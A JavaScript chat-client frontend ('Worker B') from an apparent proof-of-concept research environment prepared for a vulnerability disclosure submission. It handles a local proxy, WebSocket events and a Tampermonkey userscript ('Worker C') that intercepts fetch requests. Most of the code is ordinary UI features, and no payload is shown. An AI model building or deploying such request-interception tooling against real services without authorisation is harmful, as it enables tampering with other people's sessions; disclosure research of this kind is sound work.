    @keyframes toast-in{from{transform:translateX(20px) scale(.9);opacity:0}to{transform:translateX(0) scale(1);opacity:1}}
    .artifact-panel:not(.hidden){animation:panel-in .2s ease;}
    @keyframes panel-in{from{opacity:0;transform:translateX(20px)}to{opacity:1;transform:translateX(0)}}
  \`;
  document.head.appendChild(s);
})();

// ================================================================
// STARTUP VALIDATION — verify Worker A is reachable before showing app
// ================================================================

const StartupCheck = {
  async run() {
    try {
      const health = await fetch(State.workerAUrl + '/health', { signal: AbortSignal.timeout(3000) })
        .then(r => r.json());

      if (health.status !== 'ok') {
        console.warn('[wb] Worker A health check failed:', health);
      }

      // Cache version
      const version = health.version || '?';
      console.log(\`[Worker B] Worker A online — version \${version} — backend: \${health.backend || '?'}\`);

      return true;
    } catch (e) {
      console.warn('[Worker B] Worker A not reachable:', e.message);
      return false;
    }
  },
};

// ================================================================
// FINAL APP PATCHES — wire auto-title into send flow
// ================================================================

// After a successful send, auto-title the conversation from the first message
const _origSendFinal = App.send.bind(App);
App.send = async function() {
  const convId = State.currentConvId;
  const isNew  = !convId;
  await _origSendFinal();
  // After send, if this was a new conversation, auto-title it
  if (isNew && State.currentConvId) {
    const conv = State.conversations.get(State.currentConvId);
    const first = (conv?.messages || []).find(m => m.role === 'user');
    if (first) {
      const text = Chat.getMessageText(first);
      if (text) AutoTitle.generate(State.currentConvId, text);
    }
  }
};

// ================================================================
// FINAL: APPLY ALL PATCHES AND INITIALIZE GLOBAL SINGLETONS
// ================================================================

// Ensure the command palette Ctrl+K override fires
// (override App.openSearch again with our patched version)
App.openSearch = function() { CommandPalette.open(); };

// Run startup validation in the background
StartupCheck.run().then(ok => {
  if (!ok) {
    Toast.warn('Worker A unreachable at ' + State.workerAUrl + ' — check that it is running');
  }
});

// Initialize token budget bar after DOM is ready
document.addEventListener('DOMContentLoaded', () => {
  TokenBudget.render();

  // Auto-load notifications after login
  const waitForLogin = setInterval(() => {
    if (State.token) {
      Notifs.load();
      clearInterval(waitForLogin);
    }
  }, 1000);
});

// ================================================================
// EXPORT PUBLIC API — accessible from browser console for debugging
// ================================================================

window.__sisterPoc = {
  version:         '1.0.0',
  workers: {
    a_url:         State.workerAUrl,
    b_version:     '1.0.0',
    c_template:    () => WorkerCTemplate._getScript(),
  },
  state:           State,
  api:             API,
  chat:            Chat,
  artifacts:       ArtifactPanel,
  syntax:          Syntax,
  markdown:        Markdown,
  theme:           Theme,
  help:            Help,
  workerC:         WorkerCTemplate,
  diag:            DiagDashboard,
  backup:          BackupRestore,
  convStats:       ConvStats,
};

console.log('[Worker B] Ready. window.__sisterPoc available for debugging.');
console.log('[Worker B] Use __sisterPoc.workerC.open() to view Worker C reference template.');

// ================================================================
// WORKER A WS BRIDGE CLIENT (Worker B side)
// Receives events pushed down from Worker A's /ws endpoint.
// Worker C sends requests up through WS; Worker A may push events
// back down to Worker B for display (bi-directional bridge).
// ================================================================

const WSBridge = {
  _ws:         null,
  _connected:  false,
  _reconnectMs: 3000,
  _timer:      null,
  _listeners:  new Map(),  // event_type → [handler]

  connect() {
    if (WSBridge._ws?.readyState === WebSocket.OPEN) return;
    const wsUrl = State.workerAUrl.replace('http://', 'ws://').replace('https://', 'wss://') + '/ws';

    try {
      WSBridge._ws = new WebSocket(wsUrl);

      WSBridge._ws.onopen = () => {
        WSBridge._connected = true;
        console.log('[Worker B] WS bridge connected to Worker A');
        WSBridge._updatePill(true);

        // Identify ourselves
        WSBridge._ws.send(JSON.stringify({
          type:   'identify',
          client: 'worker-b',
          token:  State.token || null,
        }));
      };

      WSBridge._ws.onmessage = (e) => {
        let msg;
        try { msg = JSON.parse(e.data); } catch { return; }
        WSBridge._dispatch(msg);
      };

      WSBridge._ws.onerror = () => {
        WSBridge._connected = false;
        WSBridge._updatePill(false);
      };

      WSBridge._ws.onclose = () => {
        WSBridge._connected = false;
        WSBridge._updatePill(false);
        if (!WSBridge._timer) {
          WSBridge._timer = setTimeout(() => {
            WSBridge._timer = null;
            WSBridge.connect();
          }, WSBridge._reconnectMs);
        }
      };
    } catch (e) {
      console.warn('[Worker B] WS bridge connection failed:', e.message);
      WSBridge._updatePill(false);
    }
  },

  disconnect() {
    if (WSBridge._timer) { clearTimeout(WSBridge._timer); WSBridge._timer = null; }
    WSBridge._ws?.close();
    WSBridge._ws       = null;
    WSBridge._connected = false;
    WSBridge._updatePill(false);
  },

  send(type, payload) {
    if (!WSBridge._ws || WSBridge._ws.readyState !== WebSocket.OPEN) return false;
    WSBridge._ws.send(JSON.stringify({ type, ...payload, ts: Date.now() }));
    return true;
  },

  on(type, handler) {
    if (!WSBridge._listeners.has(type)) WSBridge._listeners.set(type, []);
    WSBridge._listeners.get(type).push(handler);
  },

  off(type, handler) {
    const list = WSBridge._listeners.get(type);
    if (!list) return;
    const idx = list.indexOf(handler);
    if (idx >= 0) list.splice(idx, 1);
  },

  _dispatch(msg) {
    const handlers = [
      ...(WSBridge._listeners.get(msg.type) || []),
      ...(WSBridge._listeners.get('*') || []),
    ];
    for (const h of handlers) {
      try { h(msg); } catch (e) { console.error('[WS] Handler error:', e); }
    }

    // Built-in event handling
    switch (msg.type) {
      case 'worker_c_connected':
        Toast.ok('Worker C connected via WebSocket');
        WSBridge._updatePill(true, true);
        window.__workerB?.notifyIntercept('Connected');
        break;
      case 'worker_c_disconnected':
        Toast.info('Worker C disconnected');
        WSBridge._updatePill(true, false);
        break;
      case 'fetch_intercepted':
        // Worker C intercepted a fetch — show in UI
        console.log('[Worker B] Worker C intercepted:', msg.url, msg.method);
        break;
      case 'completion_chunk':
        // Real-time completion data bridged from Worker C
        break;
      case 'config_updated':
        // Worker A config changed — reload
        App._loadWorkerAConfig?.();
        break;
      case 'notification_push':
        Notifs.push(msg.title || 'Notification', msg.body, msg.level || 'info');
        break;
      case 'pong':
        // Keepalive response
        break;
      default:
        break;
    }
  },

  _updatePill(waConnected, wcConnected) {
    const pill = document.getElementById('wc-status-pill');
    if (!pill) return;
    if (wcConnected === true) {
      pill.textContent = 'W-C ✓';
      pill.className   = 'pill pill-ok';
    } else if (wcConnected === false) {
      pill.textContent = 'W-C ✗';
      pill.className   = 'pill pill-err';
    } else if (waConnected) {
      // WS to Worker A connected but no Worker C yet
      pill.title = 'WS to Worker A connected — Worker C not yet attached';
    }
  },

  // Keepalive ping every 20s
  _startKeepalive() {
    setInterval(() => {
      if (WSBridge._connected) WSBridge.send('ping', {});
    }, 20000);
  },
};

// Start WS bridge after login
document.addEventListener('DOMContentLoaded', () => {
  const waitLogin = setInterval(() => {
    if (State.token) {
      clearInterval(waitLogin);
      WSBridge.connect();
      WSBridge._startKeepalive();
    }
  }, 500);
});

// ================================================================
// MESSAGE EDITING — edit the last human message and re-send
// ================================================================

const MessageEditor = {
  _editingId: null,
  _originalText: null,

  // Enable editing the last human message in the current conversation
  editLast() {
    const conv = State.conversations.get(State.currentConvId);
    if (!conv || !conv.messages?.length) return;

    const lastHuman = [...conv.messages].reverse().find(m => m.role === 'user');
    if (!lastHuman) return;

    const text = Chat.getMessageText(lastHuman);
    const input = document.getElementById('msg-input');
    if (!input) return;

    MessageEditor._editingId   = lastHuman.uuid;
    MessageEditor._originalText = text;

    input.value = text;
    App.autoResizeInput();
    input.focus();

    // Visual indicator
    const sendBtn = document.getElementById('send-btn');
    if (sendBtn) {
      sendBtn.textContent = '✎ Edit';
      sendBtn.title       = 'Resend edited message (Enter)';
    }

    Toast.info('Editing last message — press Enter to resend or Escape to cancel');
  },

  cancelEdit() {
    if (!MessageEditor._editingId) return;
    const input = document.getElementById('msg-input');
    if (input) input.value = '';
    MessageEditor._editingId   = null;
    MessageEditor._originalText = null;
    const sendBtn = document.getElementById('send-btn');
    if (sendBtn) { sendBtn.textContent = '▶'; sendBtn.title = 'Send (Enter)'; }
  },

  isEditing() { return !!MessageEditor._editingId; },

  finishEdit() {
    if (!MessageEditor._editingId) return;
    const sendBtn = document.getElementById('send-btn');
    if (sendBtn) { sendBtn.textContent = '▶'; sendBtn.title = 'Send (Enter)'; }
    MessageEditor._editingId   = null;
    MessageEditor._originalText = null;
  },
};

// Wire editing into keyboard shortcuts
Shortcuts.register('ctrl+shift+e', () => MessageEditor.editLast());

// Escape while editing cancels
document.addEventListener('DOMContentLoaded', () => {
  document.getElementById('msg-input')?.addEventListener('keydown', e => {
    if (e.key === 'Escape' && MessageEditor.isEditing()) {
      e.preventDefault();
      MessageEditor.cancelEdit();
    }
  });
});

// ================================================================
// ATTACHMENT RENDERING — display image and text attachments in chat
// ================================================================

// Patch Chat.renderMessage to handle content arrays with images
const _origRenderMsg = Chat.renderMessage.bind(Chat);
Chat.renderMessage = function(msg) {
  const el = _origRenderMsg(msg);

  // If message has image content blocks, add them to the message body
  const contentBlocks = Array.isArray(msg.content) ? msg.content : [];
  const imageBlocks   = contentBlocks.filter(b => b.type === 'image');

  if (imageBlocks.length > 0) {
    const body = el.querySelector('.msg-body');
    if (body) {
      const imgContainer = document.createElement('div');
      imgContainer.style.marginTop = '8px';
      for (const block of imageBlocks) {
        let src;
        if (block.source?.type === 'base64') {
          src = \`data:\${block.source.media_type || 'image/jpeg'};base64,\${block.source.data}\`;
        } else if (block.source?.url) {
          src = block.source.url;
        }
        if (src) {
          const imgEl = ImageDisplay.renderImageBlock(src, 'Attached image', true);
          imgContainer.appendChild(imgEl);
        }
      }
      body.appendChild(imgContainer);
    }
  }

  return el;
};

// ================================================================
// GETTING STARTED TOUR — shown on first login
// ================================================================

const GettingStarted = {
  _steps: [
    { title: 'Welcome to Worker B', body: 'This is the chat UI for your closed-loop Sister PoC research environment. All requests go to Worker A running at localhost:8787.', icon: '👋' },
    { title: 'Set up your backend', body: 'Go to Settings (⚙) and configure your backend. For LM Studio, make sure it\\'s running at localhost:1234. For OpenRouter, you\\'ll need an API key.', icon: '⚙' },
    { title: 'Start chatting', body: 'Type a message and press Enter to send. Worker A will route your request to the configured backend and stream the response back here.', icon: '💬' },
    { title: 'Artifacts panel', body: 'When the model generates code, it appears in the right-side Artifacts panel. You can view it, copy it, or preview HTML/JSX artifacts live.', icon: '⬜' },
    { title: 'Connect Worker C', body: 'Click the "W-C ✗" pill in the topbar for instructions on connecting Worker C (the Tampermonkey userscript) to complete the research demonstration.', icon: '🔌' },
    { title: 'You\\'re ready', body: 'Use Ctrl+K to open the command palette anytime. Press F1 for full help. Good luck with the VDP submission! 🎉', icon: '🚀' },
  ],
  _current: 0,
  _shown:   false,

  shouldShow() {
    return !localStorage.getItem('wb_tour_done');
  },

  show() {
    if (GettingStarted._shown) return;
    GettingStarted._shown   = true;
    GettingStarted._current = 0;
    GettingStarted._render();
  },

  _render() {
    let modal = document.getElementById('tour-modal');
    if (!modal) {
      modal = document.createElement('div');
      modal.id        = 'tour-modal';
      modal.className = 'modal-overlay';
      document.body.appendChild(modal);
    }

    const step  = GettingStarted._steps[GettingStarted._current];
    const total = GettingStarted._steps.length;
    const isLast = GettingStarted._current === total - 1;

    modal.innerHTML = \`<div class="modal" style="max-width:420px">
      <div class="modal-header" style="border-bottom:none;padding-bottom:0">
        <div style="display:flex;gap:4px">\${GettingStarted._steps.map((_,i) =>
          \`<div style="height:3px;flex:1;border-radius:1px;background:\${i<=GettingStarted._current?'var(--accent)':'var(--border)'}"></div>\`
        ).join('')}</div>
      </div>
      <div class="modal-body" style="text-align:center;padding:28px 24px">
        <div style="font-size:48px;margin-bottom:16px">\${step.icon}</div>
        <h2 style="font-size:18px;margin-bottom:10px">\${step.title}</h2>
        <p style="font-size:13px;color:var(--text2);line-height:1.7">\${step.body}</p>
        <div style="display:flex;justify-content:space-between;margin-top:24px;align-items:center">
          <button class="btn btn-ghost btn-sm" onclick="GettingStarted.skip()">Skip tour</button>
          <span style="font-size:11px;color:var(--text3)">\${GettingStarted._current+1} / \${total}</span>
          <button class="btn btn-accent btn-sm" onclick="GettingStarted.next()">\${isLast ? 'Get started! 🚀' : 'Next →'}</button>
        </div>
      </div>
    </div>\`;

    modal.classList.add('open');
  },

  next() {
    if (GettingStarted._current < GettingStarted._steps.length - 1) {
      GettingStarted._current++;
      GettingStarted._render();
    } else {
      GettingStarted.skip();
    }
  },

  skip() {
    document.getElementById('tour-modal')?.classList.remove('open');
    localStorage.setItem('wb_tour_done', '1');
  },
};

// ================================================================
// OFFLINE / NETWORK STATUS INDICATOR
// ================================================================

const NetworkStatus = {
  _online: navigator.onLine,

  init() {
    window.addEventListener('online',  () => NetworkStatus._setOnline(true));
    window.addEventListener('offline', () => NetworkStatus._setOnline(false));
    if (!navigator.onLine) NetworkStatus._setOnline(false);
  },

  _setOnline(online) {
    NetworkStatus._online = online;
    if (!online) {
      Toast.warn('Network offline — Worker A may be unreachable');
    } else {
      Toast.ok('Network restored');
    }
    // Update health pill color
    const bePill = document.getElementById('backend-pill');
    if (bePill && !online) {
      bePill.className = 'pill pill-err';
    }
  },
};

// ================================================================
// PWA SUPPORT STUBS — manifest and service worker registration
// ================================================================

const PWA = {
  // Check if the page is being served (not just opened as a file)
  _isServed() {
    return window.location.protocol === 'http:' || window.location.protocol === 'https:';
  },

  // Offer installation if PWA criteria met
  async checkInstallable() {
    if (!PWA._isServed()) return;
    window.addEventListener('beforeinstallprompt', (e) => {
      e.preventDefault();
      PWA._deferredPrompt = e;
      // Show install button
      const installBtn = document.getElementById('pwa-install-btn');
      if (installBtn) installBtn.style.display = '';
    });
    window.addEventListener('appinstalled', () => {
      Toast.ok('Worker B installed as app');
      PWA._deferredPrompt = null;
    });
  },

  async install() {
    if (!PWA._deferredPrompt) { Toast.info('App not installable in this context'); return; }
    PWA._deferredPrompt.prompt();
    const { outcome } = await PWA._deferredPrompt.userChoice;
    if (outcome === 'accepted') Toast.ok('Installing Worker B…');
    PWA._deferredPrompt = null;
  },
};

// ================================================================
// SHARE CONVERSATION FEATURE
// ================================================================

const ShareFeature = {
  async share(convId) {
    try {
      const resp = await API._json('/api/organizations/ORG/shared_conversations', {
        method: 'POST',
        body:   JSON.stringify({ conversation_id: convId }),
      });

      const shareUrl = resp.url || (State.workerAUrl + '/share/' + resp.uuid);

      // Try native share if available
      if (navigator.share) {
        await navigator.share({
          title: resp.name || 'Shared conversation',
          url:   shareUrl,
        });
      } else {
        await navigator.clipboard.writeText(shareUrl);
        Toast.ok('Share URL copied to clipboard');
      }
    } catch (e) {
      if (e.name === 'AbortError') return; // User cancelled native share
      Toast.err('Share failed: ' + e.message);
    }
  },
};

// ================================================================
// PRINT / PDF EXPORT
// ================================================================

const PrintExport = {
  print(convId) {
    const conv = State.conversations.get(convId);
    if (!conv) return;

    const msgs = (conv.messages || []).map(m => {
      const role = m.role === 'user' ? 'Human' : 'Assistant';
      const text = Chat.getMessageText(m);
      const time = new Date(m.created_at || Date.now()).toLocaleString();
      return \`<div class="msg-print"><div class="role-print">\${role} · \${time}</div><div>\${Markdown.render(text)}</div></div>\`;
    }).join('');

    const w = window.open('', '_blank');
    w.document.write(\`<!DOCTYPE html><html><head><meta charset="UTF-8"><title>\${conv.name || 'Conversation'}</title>
    <style>body{font-family:system-ui,sans-serif;max-width:800px;margin:40px auto;padding:20px;color:#111;}
    .msg-print{margin:20px 0;padding:12px;border-left:3px solid #e8903a;}
    .role-print{font-weight:700;font-size:11px;color:#666;text-transform:uppercase;letter-spacing:.05em;margin-bottom:6px;}
    pre{background:#f5f5f5;padding:10px;border-radius:3px;overflow-x:auto;font-size:12px;}
    code{background:#f5f5f5;padding:1px 4px;border-radius:2px;font-size:12px;}
    table{border-collapse:collapse;width:100%;}th,td{border:1px solid #ddd;padding:6px 10px;}th{background:#f5f5f5;}
    </style></head><body>
    <h1>\${conv.name || 'Conversation'}</h1>
    <p style="color:#888;font-size:12px">\${new Date().toLocaleString()} · \${(conv.messages||[]).length} messages</p>
    \${msgs}</body></html>\`);
    w.document.close();
    setTimeout(() => w.print(), 500);
  },
};

// ================================================================
// CONVERSATION MERGE — combine two conversations
// ================================================================

const ConvMerge = {
  open() {
    let modal = document.getElementById('merge-modal');
    if (!modal) {
      modal = document.createElement('div');
      modal.id        = 'merge-modal';
      modal.className = 'modal-overlay';
      document.body.appendChild(modal);
      modal.addEventListener('click', e => { if (e.target === modal) modal.classList.remove('open'); });
    }

    const convs = [...State.conversations.values()].filter(c => c.id !== State.currentConvId).slice(0, 20);

    modal.innerHTML = \`<div class="modal">
      <div class="modal-header">
        <span class="modal-title">⊕ Merge conversations</span>
        <button class="btn-icon" onclick="document.getElementById('merge-modal').classList.remove('open')">✕</button>
      </div>
      <div class="modal-body">
        <p style="font-size:12px;color:var(--text2);margin-bottom:12px">
          Append another conversation's messages to the current one.
        </p>
        <div style="max-height:300px;overflow-y:auto">
          \${convs.map(c =>
            \`<div class="conv-item" onclick="ConvMerge.merge('\${c.id}');document.getElementById('merge-modal').classList.remove('open')">
              <div class="conv-info">
                <div class="conv-name">\${ConvList.esc(c.name || 'Untitled')}</div>
                <div class="conv-meta">\${(c.messages||[]).length} messages · \${ConvList.timeAgo(c.updated_at)}</div>
              </div>
            </div>\`
          ).join('') || '<div class="dim" style="padding:12px;font-size:12px">No other conversations</div>'}
        </div>
      </div>
    </div>\`;

    modal.classList.add('open');
  },

  async merge(sourceId) {
    const target = State.conversations.get(State.currentConvId);
    const source = State.conversations.get(sourceId);
    if (!target || !source) return;
    if (!confirm(\`Merge "\${source.name || 'Untitled'}" into current conversation? This cannot be undone.\`)) return;

    target.messages = [...(target.messages || []), ...(source.messages || [])];
    target.messages.sort((a, b) => new Date(a.created_at || 0) - new Date(b.created_at || 0));
    target.updated_at = new Date().toISOString();
    await persistConversation(target);
    Chat.renderAll(target);
    Toast.ok('Conversations merged');
  },
};

// ================================================================
// THEME PICKER MODAL — full theme selection UI
// ================================================================

const ThemePicker = {
  open() {
    let modal = document.getElementById('theme-picker-modal');
    if (!modal) {
      modal = document.createElement('div');
      modal.id        = 'theme-picker-modal';
      modal.className = 'modal-overlay';
      document.body.appendChild(modal);
      modal.addEventListener('click', e => { if (e.target === modal) modal.classList.remove('open'); });
    }

    const themes = [
      { id: 'amber', name: 'Terminal Amber', desc: 'Dark charcoal with amber accents', swatch: '#e8903a' },
      { id: 'blue',  name: 'Midnight Blue',  desc: 'Deep dark with cool blue highlights', swatch: '#58a6ff' },
      { id: 'green', name: 'Forest Green',   desc: 'Dark with muted green accents', swatch: '#58b87a' },
    ];

    modal.innerHTML = \`<div class="modal" style="max-width:380px">
      <div class="modal-header">
        <span class="modal-title">🎨 Select theme</span>
        <button class="btn-icon" onclick="document.getElementById('theme-picker-modal').classList.remove('open')">✕</button>
      </div>
      <div class="modal-body" style="display:flex;flex-direction:column;gap:8px">
        \${themes.map(t => \`
          <div class="theme-option" onclick="Theme.set('\${t.id}');document.getElementById('theme-picker-modal').classList.remove('open')">
            <div class="theme-swatch" style="background:\${t.swatch}"></div>
            <div>
              <div style="font-size:13px;font-weight:700">\${t.name}</div>
              <div style="font-size:11px;color:var(--text2)">\${t.desc}</div>
            </div>
          </div>\`
        ).join('')}
      </div>
    </div>\`;

    modal.classList.add('open');
  },
};

(function injectThemePickerCSS() {
  const s = document.createElement('style');
  s.textContent = \`
    .theme-option{display:flex;gap:12px;align-items:center;padding:10px 12px;border:1px solid var(--border);border-radius:var(--radius);cursor:pointer;transition:border-color .15s;}
    .theme-option:hover{border-color:var(--accent);}
    .theme-swatch{width:28px;height:28px;border-radius:50%;flex-shrink:0;}
  \`;
  document.head.appendChild(s);
})();

// ================================================================
// FINAL: EXTEND COMMAND PALETTE WITH NEW COMMANDS
// ================================================================

// These new commands are registered into the command palette dynamically
const _extendedCommands = [
  { id: 'edit-last',   icon: '✎', label: 'Edit last message',    desc: 'Modify and resend',           fn: () => MessageEditor.editLast() },
  { id: 'share',       icon: '↗', label: 'Share conversation',   desc: 'Copy share link',              fn: () => { if (State.currentConvId) ShareFeature.share(State.currentConvId); } },
  { id: 'print',       icon: '🖨', label: 'Print conversation',   desc: 'Print or save as PDF',         fn: () => { if (State.currentConvId) PrintExport.print(State.currentConvId); } },
  { id: 'merge',       icon: '⊕', label: 'Merge conversations',  desc: 'Append another conversation', fn: () => ConvMerge.open() },
  { id: 'theme',       icon: '🎨', label: 'Change theme',         desc: 'Switch color scheme',          fn: () => ThemePicker.open() },
  { id: 'wc-panel',   icon: '🔌', label: 'Worker C setup',        desc: 'Connect the userscript',       fn: () => WorkerCPanel.open() },
  { id: 'wc-script',  icon: '📋', label: 'Copy Worker C script', desc: 'Tampermonkey template',         fn: () => WorkerCTemplate.open() },
  { id: 'reactions',  icon: '😄', label: 'Add reaction',         desc: 'React to last message',        fn: () => {
    const msgs = document.querySelectorAll('.msg[data-id]');
    const last = msgs[msgs.length - 1];
    if (last) ReactionUI.addPicker(last, last.dataset.id || '');
  }},
  { id: 'diag',        icon: '🔬', label: 'Diagnostics',          desc: 'Worker A internal state',      fn: () => DiagDashboard.open() },
  { id: 'tour',        icon: '🎯', label: 'Getting started tour', desc: 'Re-run the welcome tour',      fn: () => { localStorage.removeItem('wb_tour_done'); GettingStarted.show(); } },
];

// Patch CommandPalette._buildCommands to include extended commands
const _origBuildCommands = CommandPalette._buildCommands.bind(CommandPalette);
CommandPalette._buildCommands = function() {
  _origBuildCommands();
  CommandPalette._commands.push(..._extendedCommands);
};

// ================================================================
// INITIALIZE ALL SUBSYSTEMS
// ================================================================

document.addEventListener('DOMContentLoaded', () => {
  NetworkStatus.init();
  PWA.checkInstallable();

  // Show tour on first login
  const waitTour = setInterval(() => {
    if (State.token && document.getElementById('app')?.className?.indexOf('hidden') === -1) {
      clearInterval(waitTour);
      if (GettingStarted.shouldShow()) {
        setTimeout(() => GettingStarted.show(), 1000);
      }
    }
  }, 500);
});

// ================================================================
// PROMPT LIBRARY — save and reuse prompt templates
// ================================================================

const PromptLibrary = {
  _prompts: [],
  _storageKey: 'wb_prompt_library',

  _load() {
    try {
      const saved = localStorage.getItem(PromptLibrary._storageKey);
      PromptLibrary._prompts = saved ? JSON.parse(saved) : PromptLibrary._defaults();
    } catch {
      PromptLibrary._prompts = PromptLibrary._defaults();
    }
  },

  _save() {
    localStorage.setItem(PromptLibrary._storageKey, JSON.stringify(PromptLibrary._prompts));
  },

  _defaults() {
    return [
      { id: 'pl_1', name: 'Explain code',       category: 'Dev',     prompt: 'Explain what the following code does step by step:\\n\\n\`\`\`\\n\\n\`\`\`' },
      { id: 'pl_2', name: 'Write tests',        category: 'Dev',     prompt: 'Write comprehensive unit tests for the following code:\\n\\n\`\`\`\\n\\n\`\`\`' },
      { id: 'pl_3', name: 'Code review',        category: 'Dev',     prompt: 'Please review this code for bugs, security issues, and improvements:\\n\\n\`\`\`\\n\\n\`\`\`' },
      { id: 'pl_4', name: 'Summarize',          category: 'Writing', prompt: 'Summarize the following text concisely, preserving the key points:\\n\\n' },
      { id: 'pl_5', name: 'Improve writing',    category: 'Writing', prompt: 'Improve the clarity, flow, and grammar of this text while preserving the meaning:\\n\\n' },
      { id: 'pl_6', name: 'Translate to EN',    category: 'Writing', prompt: 'Translate the following to English:\\n\\n' },
      { id: 'pl_7', name: 'Security review',    category: 'Security',prompt: 'Perform a security review of the following code, focusing on common vulnerabilities:\\n\\n\`\`\`\\n\\n\`\`\`' },
      { id: 'pl_8', name: 'Threat model',       category: 'Security',prompt: 'Create a brief threat model for the following system:\\n\\n' },
      { id: 'pl_9', name: 'VDP writeup',        category: 'Security',prompt: 'Help me write a clear, professional bug bounty report for the following vulnerability finding:\\n\\nTitle:\\nSeverity:\\nDescription:\\nSteps to reproduce:\\nImpact:\\nRemediation:' },
    ];
  },

  open() {
    PromptLibrary._load();
    let modal = document.getElementById('prompt-lib-modal');
    if (!modal) {
      modal = document.createElement('div');
      modal.id        = 'prompt-lib-modal';
      modal.className = 'modal-overlay';
      document.body.appendChild(modal);
      modal.addEventListener('click', e => { if (e.target === modal) modal.classList.remove('open'); });
    }

    const categories = [...new Set(PromptLibrary._prompts.map(p => p.category))];

    modal.innerHTML = \`<div class="modal" style="max-width:560px;max-height:80vh;display:flex;flex-direction:column">
      <div class="modal-header" style="flex-shrink:0">
        <span class="modal-title">📚 Prompt Library</span>
        <div style="display:flex;gap:6px">
          <button class="btn btn-ghost btn-sm" onclick="PromptLibrary.addNew()">+ Add</button>
          <button class="btn-icon" onclick="document.getElementById('prompt-lib-modal').classList.remove('open')">✕</button>
        </div>
      </div>
      <div style="flex:1;overflow-y:auto;padding:10px">
        \${categories.map(cat => \`
          <div class="sidebar-label">\${cat}</div>
          \${PromptLibrary._prompts.filter(p => p.category === cat).map(p => \`
            <div class="pl-item" data-id="\${p.id}">
              <div class="pl-item-name">\${ConvList.esc(p.name)}</div>
              <div class="pl-item-preview">\${ConvList.esc(p.prompt.slice(0, 80))}…</div>
              <div class="pl-item-actions">
                <button class="btn btn-ghost btn-sm" onclick="PromptLibrary.use('\${p.id}')">Use</button>
                <button class="btn-icon" onclick="PromptLibrary.delete('\${p.id}')">🗑</button>
              </div>
            </div>\`
          ).join('')}
        \`).join('')}
      </div>
    </div>\`;

    modal.classList.add('open');
  },

  use(id) {
    const p = PromptLibrary._prompts.find(p => p.id === id);
    if (!p) return;
    const input = document.getElementById('msg-input');
    if (input) {
      input.value = p.prompt;
      App.autoResizeInput();
      input.focus();
      // Position cursor at end of template
      input.setSelectionRange(p.prompt.length, p.prompt.length);
    }
    document.getElementById('prompt-lib-modal')?.classList.remove('open');
  },

  delete(id) {
    if (!confirm('Delete this prompt?')) return;
    PromptLibrary._prompts = PromptLibrary._prompts.filter(p => p.id !== id);
    PromptLibrary._save();
    PromptLibrary.open();
  },

  addNew() {
    const name     = prompt('Prompt name:');
    if (!name) return;
    const category = prompt('Category (Dev/Writing/Security/Other):', 'Other') || 'Other';
    const promptText = prompt('Prompt text:');
    if (!promptText) return;
    PromptLibrary._prompts.push({
      id:       'pl_' + Date.now(),
      name,
      category,
      prompt:   promptText,
    });
    PromptLibrary._save();
    PromptLibrary.open();
    Toast.ok('Prompt saved');
  },

  save(name, category, promptText) {
    PromptLibrary._load();
    PromptLibrary._prompts.push({ id: 'pl_' + Date.now(), name, category, prompt: promptText });
    PromptLibrary._save();
    Toast.ok('Prompt added to library');
  },
};

(function injectPromptLibCSS() {
  const s = document.createElement('style');
  s.textContent = \`
    .pl-item{padding:8px 10px;border:1px solid var(--border);border-radius:var(--radius);margin-bottom:6px;transition:border-color .15s;}
    .pl-item:hover{border-color:var(--border2);}
    .pl-item-name{font-size:13px;font-weight:700;margin-bottom:2px;}
    .pl-item-preview{font-size:11px;color:var(--text3);font-family:var(--font-mono);overflow:hidden;text-overflow:ellipsis;white-space:nowrap;margin-bottom:6px;}
    .pl-item-actions{display:flex;gap:6px;align-items:center;}
  \`;
  document.head.appendChild(s);
})();

// Add Prompt Library to command palette
_extendedCommands.push({
  id: 'prompt-lib', icon: '📚', label: 'Prompt Library', desc: 'Browse saved prompt templates', fn: () => PromptLibrary.open(),
});

// Add Prompt Library button to input toolbar
(function addPromptLibBtn() {
  if (document.readyState === 'loading') {
    document.addEventListener('DOMContentLoaded', addPromptLibBtn);
    return;
  }
  const toolbar = document.querySelector('.input-toolbar');
  if (!toolbar) return;
  const btn = document.createElement('button');
  btn.className = 'btn-icon';
  btn.title     = 'Prompt library';
  btn.textContent = '📚';
  btn.onclick   = () => PromptLibrary.open();
  toolbar.insertBefore(btn, toolbar.firstChild);
})();

// ================================================================
// SESSION TRACKER — shows session info and token usage
// ================================================================

const SessionTracker = {
  _sessionStart:   Date.now(),
  _messagesThisSes: 0,
  _tokensThisSes:   0,

  recordMessage(inputTokens, outputTokens) {
    SessionTracker._messagesThisSes++;
    SessionTracker._tokensThisSes += (inputTokens || 0) + (outputTokens || 0);
  },

  getSessionInfo() {
    const elapsed = Date.now() - SessionTracker._sessionStart;
    const minutes = Math.floor(elapsed / 60000);
    const hours   = Math.floor(minutes / 60);
    const timeStr = hours > 0 ? \`\${hours}h \${minutes % 60}m\` : \`\${minutes}m\`;

    return {
      started:          new Date(SessionTracker._sessionStart).toLocaleTimeString(),
      duration:         timeStr,
      messages_sent:    SessionTracker._messagesThisSes,
      tokens_used:      SessionTracker._tokensThisSes,
      conversations:    State.conversations.size,
      current_model:    State.config.model,
      mutation_mode:    State.config.mutation_mode,
      thinking_enabled: State.config.thinking_mode,
      tools_enabled:    State.config.tools_enabled,
      worker_a_url:     State.workerAUrl,
      ws_connected:     WSBridge._connected,
    };
  },

  show() {
    const info = SessionTracker.getSessionInfo();
    let modal = document.getElementById('session-modal');
    if (!modal) {
      modal = document.createElement('div');
      modal.id        = 'session-modal';
      modal.className = 'modal-overlay';
      document.body.appendChild(modal);
      modal.addEventListener('click', e => { if (e.target === modal) modal.classList.remove('open'); });
    }

    modal.innerHTML = \`<div class="modal" style="max-width:380px">
      <div class="modal-header">
        <span class="modal-title">👤 Session info</span>
        <button class="btn-icon" onclick="document.getElementById('session-modal').classList.remove('open')">✕</button>
      </div>
      <div class="modal-body">
        <div class="model-info-grid">
          \${Object.entries(info).map(([k, v]) =>
            \`<div class="model-info-item"><span class="model-info-key">\${k.replace(/_/g,' ')}</span><span class="model-info-val" style="font-size:11px">\${String(v)}</span></div>\`
          ).join('')}
        </div>
        <button class="btn btn-danger btn-sm" onclick="if(confirm('Clear all local data?')){localStorage.clear();indexedDB.deleteDatabase('sister-poc-wb');location.reload()}" style="margin-top:12px;width:100%;justify-content:center">🗑 Clear all local data</button>
      </div>
    </div>\`;
    modal.classList.add('open');
  },
};

// Wire session tracker into App._showApp
const _origShowApp = App._showApp.bind(App);
App._showApp = async function() {
  SessionTracker._sessionStart = Date.now();
  await _origShowApp();
};

// Wire into SSE's onDone via the existing token budget patch
const _prevWBOnDone = window.__workerB?.onMessage;
